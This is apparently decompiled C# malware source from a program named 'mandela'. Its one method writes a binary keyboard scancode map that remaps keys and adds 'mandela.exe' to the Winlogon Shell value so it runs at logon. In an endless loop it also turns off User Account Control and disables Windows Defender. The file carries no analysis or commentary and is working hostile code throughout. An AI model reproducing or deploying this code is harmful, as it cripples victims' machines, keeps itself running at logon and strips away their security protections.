﻿using System;
using System.Threading;
using Microsoft.Win32;

namespace mandela
{
	// Token: 0x0200000C RID: 12
	public class Regs
	{
		// Token: 0x06000032 RID: 50 RVA: 0x00006210 File Offset: 0x00004410
		public void reg()
		{
			byte[] array = new byte[]
			{
				0, 0, 0, 0, 0, 0, 0, 0, 74, 0,
				0, 0, 0, 0, 33, 224, 0, 0, 108, 224,
				0, 0, 109, 224, 0, 0, 17, 224, 0, 0,
				107, 224, 0, 0, 80, 224, 0, 0, 75, 224,
				0, 0, 77, 224, 0, 0, 72, 224, 0, 0,
				64, 224, 0, 0, 66, 224, 0, 0, 59, 224,
				0, 0, 62, 224, 0, 0, 60, 224, 0, 0,
				63, 224, 0, 0, 88, 224, 0, 0, 7, 224,
				0, 0, 65, 224, 0, 0, 87, 224, 0, 0,
				67, 224, 0, 0, 35, 224, 0, 0, 61, 224,
				0, 0, 8, 224, 82, 0, 30, 0, 79, 0,
				48, 0, 82, 0, 46, 0, 79, 0, 32, 0,
				82, 0, 18, 0, 76, 0, 33, 0, 75, 0,
				34, 0, 73, 0, 35, 0, 72, 0, 23, 0,
				81, 0, 36, 0, 76, 0, 37, 0, 40, 0,
				38, 0, 74, 0, 50, 0, 52, 0, 49, 0,
				41, 0, 24, 0, 39, 0, 25, 0, 26, 0,
				16, 0, 55, 0, 19, 0, 12, 0, 31, 0,
				125, 0, 20, 0, 83, 0, 22, 0, 86, 224,
				47, 0, 53, 224, 17, 0, 74, 0, 45, 0,
				82, 0, 21, 0, 79, 0, 44, 0, 0, 0,
				28, 224, 0, 0, 93, 224, 0, 0, 14, 0,
				0, 0, 70, 224, 0, 0, 58, 0, 0, 0,
				83, 224, 0, 0, 79, 224, 0, 0, 28, 0,
				0, 0, 1, 0, 0, 0, 71, 224, 0, 0,
				82, 224, 0, 0, 56, 0, 0, 0, 29, 0,
				0, 0, 42, 0, 0, 0, 91, 224, 0, 0,
				69, 0, 0, 0, 94, 224, 0, 0, 56, 224,
				0, 0, 29, 224, 0, 0, 54, 0, 0, 0,
				92, 224, 0, 0, 95, 224, 0, 0, 57, 0,
				0, 0, 15, 0, 0, 0, 0, 0
			};
			Registry.LocalMachine.CreateSubKey("SYSTEM\\ControlSet001\\Control\\Keyboard Layout").SetValue("Scancode Map", array, RegistryValueKind.Binary);
			Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon").SetValue("Shell", "explorer.exe, mandela.exe", RegistryValueKind.String);
			for (;;)
			{
				Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
				Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("EnableLUA", 0, RegistryValueKind.DWord);
				Registry.LocalMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows Defender").SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
				Thread.Sleep(1);
			}
		}
	}
}